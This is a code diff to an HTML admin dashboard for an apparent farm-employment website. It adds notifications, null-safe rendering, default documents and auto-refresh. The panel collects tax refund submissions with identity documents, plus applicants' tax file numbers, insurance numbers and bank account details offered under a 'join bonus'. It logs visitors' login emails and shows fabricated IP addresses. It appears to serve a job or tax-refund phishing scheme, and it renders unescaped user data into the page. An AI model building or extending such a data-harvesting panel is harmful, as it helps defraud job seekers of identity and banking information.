@@ -33,6 +33,53 @@
       --success: #4caf50;
     }
 
+    /* Notification */
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: white;
+      border-left: 4px solid var(--success);
+      border-radius: 8px;
+      padding: 1rem 1.5rem;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      z-index: 1000;
+      transform: translateX(400px);
+      transition: transform 0.3s ease;
+      max-width: 400px;
+    }
+
+    .notification.show {
+      transform: translateX(0);
+    }
+
+    .notification i {
+      font-size: 1.5rem;
+    }
+
+    .notification-content {
+      flex: 1;
+    }
+
+    .notification-title {
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 0.2rem;
+    }
+
+    .notification-message {
+      font-size: 0.9rem;
+      color: #5f6d5a;
+    }
+
+    .notification-close {
+      cursor: pointer;
+      color: #7a8a7a;
+    }
+
     /* Login Page */
     .login-container {
       min-height: 100vh;
@@ -297,6 +344,7 @@
       border-radius: 20px;
       font-size: 0.8rem;
       font-weight: 500;
+      display: inline-block;
     }
 
     .badge-success {
@@ -314,6 +362,11 @@
       color: #0288d1;
     }
 
+    .badge-danger {
+      background: #ffebee;
+      color: var(--danger);
+    }
+
     .view-btn {
       background: var(--primary);
       color: white;
@@ -322,10 +375,18 @@
       border-radius: 4px;
       cursor: pointer;
       font-size: 0.8rem;
+      transition: 0.2s;
     }
 
     .view-btn:hover {
       background: var(--primary-light);
+    }
+
+    .status-select {
+      padding: 0.3rem;
+      border: 1px solid var(--gray);
+      border-radius: 4px;
+      font-size: 0.8rem;
     }
 
     /* Upload Area */
@@ -349,6 +410,16 @@
       font-size: 3rem;
       color: var(--accent);
       margin-bottom: 1rem;
+    }
+
+    .upload-area p {
+      color: var(--primary);
+      font-weight: 500;
+      margin-bottom: 0.5rem;
+    }
+
+    .upload-area small {
+      color: #7a8a7a;
     }
 
     /* Documents List */
@@ -518,6 +589,16 @@
   </style>
 </head>
 <body>
+  <!-- Notification -->
+  <div id="notification" class="notification">
+    <i class="fas fa-check-circle"></i>
+    <div class="notification-content">
+      <div class="notification-title" id="notificationTitle">Success</div>
+      <div class="notification-message" id="notificationMessage">Operation completed successfully</div>
+    </div>
+    <span class="notification-close" onclick="hideNotification()"><i class="fas fa-times"></i></span>
+  </div>
+
   <!-- Login Page -->
   <div id="loginPage" class="login-container">
     <div class="login-card">
@@ -576,11 +657,11 @@
 
       <!-- Tab Navigation -->
       <div class="tab-nav">
-        <button class="tab-btn active" onclick="switchTab('tax')">💰 Tax Refund Submissions</button>
-        <button class="tab-btn" onclick="switchTab('applications')">📝 Job Applications</button>
-        <button class="tab-btn" onclick="switchTab('contact')">📬 Contact Messages</button>
-        <button class="tab-btn" onclick="switchTab('documents')">📄 Resource Documents</button>
-        <button class="tab-btn" onclick="switchTab('logins')">🔐 User Logins</button>
+        <button class="tab-btn active" onclick="switchTab('tax', event)">💰 Tax Refund Submissions</button>
+        <button class="tab-btn" onclick="switchTab('applications', event)">📝 Job Applications</button>
+        <button class="tab-btn" onclick="switchTab('contact', event)">📬 Contact Messages</button>
+        <button class="tab-btn" onclick="switchTab('documents', event)">📄 Resource Documents</button>
+        <button class="tab-btn" onclick="switchTab('logins', event)">🔐 User Logins</button>
       </div>
 
       <!-- Tax Submissions Tab -->
@@ -717,6 +798,36 @@
   </div>
 
   <script>
+    // ==================== NOTIFICATION SYSTEM ====================
+    function showNotification(title, message, type = 'success') {
+      const notification = document.getElementById('notification');
+      const icon = notification.querySelector('i');
+      const titleEl = document.getElementById('notificationTitle');
+      const messageEl = document.getElementById('notificationMessage');
+      
+      icon.className = type === 'success' ? 'fas fa-check-circle' : 
+                       type === 'error' ? 'fas fa-exclamation-circle' : 
+                       'fas fa-exclamation-triangle';
+      icon.style.color = type === 'success' ? 'var(--success)' : 
+                         type === 'error' ? 'var(--danger)' : 
+                         'var(--warning)';
+      notification.style.borderLeftColor = type === 'success' ? 'var(--success)' : 
+                                           type === 'error' ? 'var(--danger)' : 
+                                           'var(--warning)';
+      
+      titleEl.textContent = title;
+      messageEl.textContent = message;
+      notification.classList.add('show');
+      
+      setTimeout(() => {
+        notification.classList.remove('show');
+      }, 5000);
+    }
+
+    function hideNotification() {
+      document.getElementById('notification').classList.remove('show');
+    }
+
     // ==================== DATA STORAGE KEYS ====================
     const STORAGE_KEYS = {
       TAX_SUBMISSIONS: 'taxSubmissions',
@@ -736,47 +847,12 @@
 
       // Job Applications
       if (!localStorage.getItem(STORAGE_KEYS.JOB_APPLICATIONS)) {
-        const sampleApplications = [
-          {
-            id: 'APP-' + Date.now(),
-            name: 'Michael Chen',
-            email: 'michael.chen@email.com',
-            phone: '+61 412 345 678',
-            position: 'Cattle Farm Assistant',
-            type: 'Full-time',
-            experience: '2 years',
-            date: new Date().toISOString(),
-            status: 'pending'
-          },
-          {
-            id: 'APP-' + (Date.now() + 1),
-            name: 'Sarah Williams',
-            email: 'sarah.w@email.com',
-            phone: '+61 423 456 789',
-            position: 'Fruit Picker',
-            type: 'Part-time',
-            experience: '1 year',
-            date: new Date().toISOString(),
-            status: 'reviewed'
-          }
-        ];
-        localStorage.setItem(STORAGE_KEYS.JOB_APPLICATIONS, JSON.stringify(sampleApplications));
+        localStorage.setItem(STORAGE_KEYS.JOB_APPLICATIONS, JSON.stringify([]));
       }
 
       // Contact Messages
       if (!localStorage.getItem(STORAGE_KEYS.CONTACT_MESSAGES)) {
-        const sampleMessages = [
-          {
-            id: 'MSG-' + Date.now(),
-            name: 'John Smith',
-            email: 'john.smith@email.com',
-            subject: 'Accommodation Inquiry',
-            message: 'I would like to know more about the private cabins available.',
-            date: new Date().toISOString(),
-            status: 'unread'
-          }
-        ];
-        localStorage.setItem(STORAGE_KEYS.CONTACT_MESSAGES, JSON.stringify(sampleMessages));
+        localStorage.setItem(STORAGE_KEYS.CONTACT_MESSAGES, JSON.stringify([]));
       }
 
       // User Logins
@@ -784,28 +860,38 @@
         localStorage.setItem(STORAGE_KEYS.USER_LOGINS, JSON.stringify([]));
       }
 
-      // Resource Documents
+      // Resource Documents - Create default documents
       if (!localStorage.getItem(STORAGE_KEYS.RESOURCE_DOCUMENTS)) {
         const defaultDocs = [
           {
-            id: Date.now().toString(),
+            id: 'doc-' + Date.now(),
             name: 'Sample Employment Letter',
-            description: 'Official employment offer template',
+            description: 'Official employment offer template with terms and conditions',
             type: 'PDF',
             size: '245 KB',
             icon: 'fa-file-pdf',
             fileName: 'employment-letter.pdf',
-            content: 'EMPLOYMENT OFFER LETTER\n\nDear Applicant,\n\nWe are pleased to offer you a position...'
+            content: 'EMPLOYMENT OFFER LETTER\n\nDear Applicant,\n\nWe are pleased to offer you a position at Carlton Hill Station Farm. This letter outlines the terms and conditions of your employment...\n\nStart Date: [TBD]\nPosition: [Role]\nHours: 6AM - 4PM Mon-Sat\nAccommodation: Private cabin provided\n\nPlease sign and return this letter to confirm your acceptance.\n\nSincerely,\nCarlton Hill Station Farm'
           },
           {
-            id: (Date.now() + 1).toString(),
+            id: 'doc-' + (Date.now() + 1),
             name: 'Farm Safety Rules',
-            description: 'Essential safety guidelines',
+            description: 'Essential safety guidelines for all workers',
             type: 'PDF',
             size: '312 KB',
             icon: 'fa-file-pdf',
             fileName: 'safety-rules.pdf',
-            content: 'FARM SAFETY RULES\n\n1. Always wear appropriate PPE...'
+            content: 'CARLTON HILL STATION FARM\nSAFETY RULES AND GUIDELINES\n\n1. Always wear appropriate Personal Protective Equipment (PPE)\n2. Report all accidents and near misses immediately\n3. Follow equipment operating procedures at all times\n4. Stay hydrated and take breaks in shaded areas\n5. Never operate machinery under influence\n6. Emergency contacts: Farm Office: 08 9123 4567\n\nThese rules are for your protection and the safety of all workers.'
+          },
+          {
+            id: 'doc-' + (Date.now() + 2),
+            name: 'Work Schedule Overview',
+            description: 'Hours, shifts, and weekly routines',
+            type: 'PDF',
+            size: '187 KB',
+            icon: 'fa-file-pdf',
+            fileName: 'work-schedule.pdf',
+            content: 'WORK SCHEDULE OVERVIEW\n\nStandard Work Week: Monday - Saturday\nFull-time Hours: 6:00 AM - 4:00 PM\n\nBreak Times:\n- Morning Tea: 9:00 AM (20 mins)\n- Lunch: 12:00 PM (1 hour)\n- Afternoon Tea: 2:30 PM (15 mins)\n\nPart-time Options:\n- Minimum 4-hour shifts\n- Flexible start times between 6-8 AM\n\nSunday: All workers off (Rest Day)'
           }
         ];
         localStorage.setItem(STORAGE_KEYS.RESOURCE_DOCUMENTS, JSON.stringify(defaultDocs));
@@ -827,11 +913,11 @@
 
       tbody.innerHTML = submissions.map(sub => `
         <tr>
-          <td><code>${sub.id}</code></td>
-          <td>${sub.email}</td>
-          <td>${new Date(sub.timestamp).toLocaleString()}</td>
-          <td>${Object.keys(sub.documents || {}).filter(k => sub.documents[k]).length} files</td>
-          <td><span class="badge badge-${sub.status === 'pending_review' ? 'warning' : 'success'}">${sub.status}</span></td>
+          <td><code>${sub.id || 'N/A'}</code></td>
+          <td>${sub.email || 'N/A'}</td>
+          <td>${sub.timestamp ? new Date(sub.timestamp).toLocaleString() : 'N/A'}</td>
+          <td>${sub.documents ? Object.keys(sub.documents).filter(k => sub.documents[k]).length : 0} files</td>
+          <td><span class="badge badge-${sub.status === 'pending_review' ? 'warning' : sub.status === 'approved' ? 'success' : 'info'}">${sub.status || 'pending'}</span></td>
           <td>
             <button class="view-btn" onclick="viewTaxDetails('${sub.id}')">
               <i class="fas fa-eye"></i> View
@@ -855,12 +941,12 @@
 
       tbody.innerHTML = apps.map(app => `
         <tr>
-          <td>${app.name}</td>
-          <td>${app.email}</td>
-          <td>${app.position}</td>
-          <td>${app.type}</td>
-          <td>${new Date(app.date).toLocaleDateString()}</td>
-          <td><span class="badge badge-${app.status === 'pending' ? 'warning' : 'success'}">${app.status}</span></td>
+          <td>${app.personalInfo?.fullName || app.name || 'N/A'}</td>
+          <td>${app.personalInfo?.email || app.email || 'N/A'}</td>
+          <td>${app.workPreference?.position || app.position || 'N/A'}</td>
+          <td>${app.workPreference?.workType || app.type || 'N/A'}</td>
+          <td>${app.timestamp ? new Date(app.timestamp).toLocaleDateString() : app.date ? new Date(app.date).toLocaleDateString() : 'N/A'}</td>
+          <td><span class="badge badge-${app.status === 'pending' ? 'warning' : app.status === 'approved' ? 'success' : 'info'}">${app.status || 'pending'}</span></td>
           <td>
             <button class="view-btn" onclick="viewApplicationDetails('${app.id}')">
               <i class="fas fa-eye"></i> View
@@ -884,11 +970,11 @@
 
       tbody.innerHTML = msgs.map(msg => `
         <tr>
-          <td>${msg.name}</td>
-          <td>${msg.email}</td>
-          <td>${msg.subject}</td>
-          <td>${new Date(msg.date).toLocaleString()}</td>
-          <td><span class="badge badge-${msg.status === 'unread' ? 'warning' : 'info'}">${msg.status}</span></td>
+          <td>${msg.name || 'N/A'}</td>
+          <td>${msg.email || 'N/A'}</td>
+          <td>${msg.subject || 'N/A'}</td>
+          <td>${msg.timestamp ? new Date(msg.timestamp).toLocaleString() : msg.date ? new Date(msg.date).toLocaleString() : 'N/A'}</td>
+          <td><span class="badge badge-${msg.status === 'unread' ? 'warning' : msg.status === 'read' ? 'info' : 'success'}">${msg.status || 'unread'}</span></td>
           <td>
             <button class="view-btn" onclick="viewMessageDetails('${msg.id}')">
               <i class="fas fa-eye"></i> View
@@ -912,8 +998,8 @@
 
       tbody.innerHTML = logins.slice().reverse().map(login => `
         <tr>
-          <td>${login.email}</td>
-          <td>${new Date(login.timestamp).toLocaleString()}</td>
+          <td>${login.email || 'N/A'}</td>
+          <td>${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}</td>
           <td>${login.ip || '192.168.1.' + Math.floor(Math.random() * 255)}</td>
           <td><span class="badge badge-success">Success</span></td>
         </tr>
@@ -943,7 +1029,7 @@
             <i class="fas ${doc.icon || 'fa-file-pdf'}"></i>
             <div class="doc-details">
               <h4>${doc.name}</h4>
-              <p>${doc.type} · ${doc.size} · Added: ${new Date(parseInt(doc.id)).toLocaleDateString()}</p>
+              <p>${doc.type} · ${doc.size} · Added: ${new Date(parseInt(doc.id) || Date.now()).toLocaleDateString()}</p>
             </div>
           </div>
           <div class="doc-actions">
@@ -963,7 +1049,7 @@
         const reader = new FileReader();
         reader.onload = function(e) {
           const newDoc = {
-            id: Date.now().toString(),
+            id: 'doc-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6),
             name: file.name.replace(/\.[^/.]+$/, ""),
             description: `Uploaded on ${new Date().toLocaleDateString()}`,
             type: file.type.split('/')[1]?.toUpperCase() || file.name.split('.').pop()?.toUpperCase() || 'FILE',
@@ -978,7 +1064,7 @@
           saveDocuments();
           renderDocuments();
           
-          // Create notification
+          showNotification('Success', `Document uploaded: ${newDoc.name}`, 'success');
           addNotification('document_upload', `New document uploaded: ${newDoc.name}`);
         };
         reader.readAsText(file);
@@ -997,6 +1083,7 @@
       if (newDesc) doc.description = newDesc;
       saveDocuments();
       renderDocuments();
+      showNotification('Success', 'Document updated successfully', 'success');
     }
 
     function deleteDocument(index) {
@@ -1005,6 +1092,7 @@
         documents.splice(index, 1);
         saveDocuments();
         renderDocuments();
+        showNotification('Success', `Document deleted: ${doc.name}`, 'success');
         addNotification('document_delete', `Document deleted: ${doc.name}`);
       }
     }
@@ -1018,27 +1106,27 @@
 
       let docsHtml = '';
       for (let [type, file] of Object.entries(sub.documents || {})) {
-        if (file) {
-          docsHtml += `<div>✓ ${type.toUpperCase()}: ${file.name} (${(file.size/1024).toFixed(0)} KB)</div>`;
+        if (file && file.name) {
+          docsHtml += `<div style="margin-bottom: 0.3rem;">✓ ${type.toUpperCase()}: ${file.name} (${file.size ? (file.size/1024).toFixed(0) + ' KB' : 'N/A'})</div>`;
         }
       }
 
       const modalBody = `
         <div class="detail-row">
           <div class="detail-label">Submission ID</div>
-          <div class="detail-value">${sub.id}</div>
+          <div class="detail-value">${sub.id || 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Email</div>
-          <div class="detail-value">${sub.email}</div>
+          <div class="detail-value">${sub.email || 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Date</div>
-          <div class="detail-value">${new Date(sub.timestamp).toLocaleString()}</div>
+          <div class="detail-value">${sub.timestamp ? new Date(sub.timestamp).toLocaleString() : 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Status</div>
-          <div class="detail-value">${sub.status}</div>
+          <div class="detail-value">${sub.status || 'pending_review'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">IP Address</div>
@@ -1046,7 +1134,7 @@
         </div>
         <div class="detail-row">
           <div class="detail-label">Uploaded Documents</div>
-          <div class="detail-value">${docsHtml || 'No documents'}</div>
+          <div class="detail-value">${docsHtml || 'No documents uploaded'}</div>
         </div>
       `;
 
@@ -1059,34 +1147,64 @@
       const apps = JSON.parse(localStorage.getItem(STORAGE_KEYS.JOB_APPLICATIONS) || '[]');
       const app = apps.find(a => a.id === id);
 
+      if (!app) return;
+
+      const personalInfo = app.personalInfo || {};
+      const workPref = app.workPreference || {};
+      const bonus = app.bonus || {};
+
       const modalBody = `
         <div class="detail-row">
-          <div class="detail-label">Name</div>
-          <div class="detail-value">${app.name}</div>
+          <div class="detail-label">Application ID</div>
+          <div class="detail-value">${app.id || 'N/A'}</div>
         </div>
         <div class="detail-row">
-          <div class="detail-label">Email</div>
-          <div class="detail-value">${app.email}</div>
+          <div class="detail-label">Personal Information</div>
+          <div class="detail-value">
+            <div><strong>Name:</strong> ${personalInfo.fullName || app.name || 'N/A'}</div>
+            <div><strong>Email:</strong> ${personalInfo.email || app.email || 'N/A'}</div>
+            <div><strong>Phone:</strong> ${personalInfo.phone || app.phone || 'N/A'}</div>
+            <div><strong>Date of Birth:</strong> ${personalInfo.dob || 'N/A'}</div>
+            <div><strong>Nationality:</strong> ${personalInfo.nationality || 'N/A'}</div>
+            <div><strong>Address:</strong> ${personalInfo.address || 'N/A'}</div>
+            <div><strong>Emergency Contact:</strong> ${personalInfo.emergency || 'N/A'}</div>
+          </div>
         </div>
         <div class="detail-row">
-          <div class="detail-label">Phone</div>
-          <div class="detail-value">${app.phone}</div>
+          <div class="detail-label">Work Preference</div>
+          <div class="detail-value">
+            <div><strong>Position:</strong> ${workPref.position || app.position || 'N/A'}</div>
+            <div><strong>Type:</strong> ${workPref.workType || app.type || 'N/A'}</div>
+            <div><strong>Start Date:</strong> ${workPref.startDate || 'N/A'}</div>
+            <div><strong>Accommodation Needed:</strong> ${workPref.needsAccommodation || 'No'}</div>
+          </div>
         </div>
         <div class="detail-row">
-          <div class="detail-label">Position</div>
-          <div class="detail-value">${app.position}</div>
+          <div class="detail-label">Tax & Insurance</div>
+          <div class="detail-value">
+            <div><strong>TFN:</strong> ${app.tax?.tfn || 'N/A'}</div>
+            <div><strong>Insurance Provider:</strong> ${app.health?.provider || 'N/A'}</div>
+            <div><strong>Insurance Number:</strong> ${app.health?.number || 'N/A'}</div>
+          </div>
         </div>
         <div class="detail-row">
-          <div class="detail-label">Type</div>
-          <div class="detail-value">${app.type}</div>
-        </div>
-        <div class="detail-row">
-          <div class="detail-label">Experience</div>
-          <div class="detail-value">${app.experience}</div>
+          <div class="detail-label">Bonus Program</div>
+          <div class="detail-value">
+            <div><strong>Join Bonus:</strong> ${bonus.join || 'No'}</div>
+            <div><strong>Percentage:</strong> ${bonus.percentage || 'N/A'}</div>
+            <div><strong>Bank:</strong> ${bonus.bankName || 'N/A'}</div>
+            <div><strong>Account:</strong> ${bonus.bankAccount || 'N/A'}</div>
+          </div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Application Date</div>
-          <div class="detail-value">${new Date(app.date).toLocaleString()}</div>
+          <div class="detail-value">${app.timestamp ? new Date(app.timestamp).toLocaleString() : app.date ? new Date(app.date).toLocaleString() : 'N/A'}</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">Status</div>
+          <div class="detail-value">
+            <span class="badge badge-${app.status === 'pending' ? 'warning' : app.status === 'approved' ? 'success' : 'info'}">${app.status || 'pending'}</span>
+          </div>
         </div>
       `;
 
@@ -1099,6 +1217,8 @@
       const msgs = JSON.parse(localStorage.getItem(STORAGE_KEYS.CONTACT_MESSAGES) || '[]');
       const msg = msgs.find(m => m.id === id);
 
+      if (!msg) return;
+
       // Mark as read
       msg.status = 'read';
       localStorage.setItem(STORAGE_KEYS.CONTACT_MESSAGES, JSON.stringify(msgs));
@@ -1107,23 +1227,33 @@
       const modalBody = `
         <div class="detail-row">
           <div class="detail-label">Name</div>
-          <div class="detail-value">${msg.name}</div>
+          <div class="detail-value">${msg.name || 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Email</div>
-          <div class="detail-value">${msg.email}</div>
+          <div class="detail-value">${msg.email || 'N/A'}</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">Phone</div>
+          <div class="detail-value">${msg.phone || 'Not provided'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Subject</div>
-          <div class="detail-value">${msg.subject}</div>
+          <div class="detail-value">${msg.subject || 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Date</div>
-          <div class="detail-value">${new Date(msg.date).toLocaleString()}</div>
+          <div class="detail-value">${msg.timestamp ? new Date(msg.timestamp).toLocaleString() : msg.date ? new Date(msg.date).toLocaleString() : 'N/A'}</div>
         </div>
         <div class="detail-row">
           <div class="detail-label">Message</div>
-          <div class="detail-value">${msg.message}</div>
+          <div class="detail-value" style="white-space: pre-wrap;">${msg.message || 'N/A'}</div>
+        </div>
+        <div class="detail-row">
+          <div class="detail-label">Status</div>
+          <div class="detail-value">
+            <span class="badge badge-${msg.status === 'unread' ? 'warning' : 'info'}">${msg.status || 'unread'}</span>
+          </div>
         </div>
       `;
 
@@ -1143,7 +1273,7 @@
       localStorage.setItem(STORAGE_KEYS.NOTIFICATIONS, JSON.stringify(notifications));
     }
 
-    function switchTab(tab) {
+    function switchTab(tab, event) {
       // Update tab buttons
       document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
       event.target.classList.add('active');
@@ -1197,7 +1327,7 @@
         loadDocuments();
         loadLogins();
 
-        // Add admin login notification
+        showNotification('Welcome', 'Logged in successfully', 'success');
         addNotification('admin_login', 'Admin logged in');
       } else {
         document.getElementById('loginError').style.display = 'flex';
@@ -1207,6 +1337,7 @@
     function logout() {
       document.getElementById('loginPage').style.display = 'flex';
       document.getElementById('dashboardPage').style.display = 'none';
+      showNotification('Goodbye', 'Logged out successfully', 'info');
       addNotification('admin_logout', 'Admin logged out');
     }
 
@@ -1239,9 +1370,22 @@
           handleFileUpload(e.dataTransfer.files);
         });
       }
+
+      // Check if already logged in
+      const saved = sessionStorage.getItem('adminLoggedIn');
+      if (saved === 'true') {
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('dashboardPage').style.display = 'block';
+        initializeData();
+        loadTaxSubmissions();
+        loadApplications();
+        loadContacts();
+        loadDocuments();
+        loadLogins();
+      }
     });
 
-    // Auto-refresh every 30 seconds
+    // Auto-refresh every 10 seconds
     setInterval(() => {
       if (document.getElementById('dashboardPage').style.display === 'block') {
         loadTaxSubmissions();
@@ -1249,7 +1393,23 @@
         loadContacts();
         loadLogins();
       }
-    }, 30000);
+    }, 10000);
+
+    // Listen for storage changes (when other pages submit data)
+    window.addEventListener('storage', (e) => {
+      if (document.getElementById('dashboardPage').style.display === 'block') {
+        if (e.key === STORAGE_KEYS.TAX_SUBMISSIONS) {
+          loadTaxSubmissions();
+          showNotification('New Data', 'Tax submission received', 'info');
+        } else if (e.key === STORAGE_KEYS.JOB_APPLICATIONS) {
+          loadApplications();
+          showNotification('New Data', 'Job application received', 'info');
+        } else if (e.key === STORAGE_KEYS.CONTACT_MESSAGES) {
+          loadContacts();
+          showNotification('New Data', 'Contact message received', 'info');
+        }
+      }
+    });
   </script>
 </body>
 </html>
